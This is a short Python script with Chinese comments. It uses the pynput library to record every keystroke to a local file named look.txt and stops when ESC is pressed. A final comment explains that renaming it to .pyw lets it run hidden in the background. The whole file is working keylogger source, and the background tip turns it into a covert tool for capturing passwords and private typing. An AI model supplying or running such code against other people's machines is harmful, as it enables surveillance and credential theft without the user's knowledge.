from pynput.keyboard import Key
from pynput.keyboard import Listener

wr = open('look.txt','w',encoding="utf-8")

def keyboard_press(key): #<96-105>數字小鍵盤的0-9 <110>數字小鍵盤的Del(.)
    wr.write(f'key:{key}\n')
    print(f'按下key:{key}')

def keyboard_release(key):
    print(f'放開 key:{key}')
    if key == Key.esc:  # 按下ESC鍵,結束
        return False

with Listener(on_press=keyboard_press,
        on_release=keyboard_release) as listener:
        listener.join()
#副檔名改成.pyw就可以在後台執行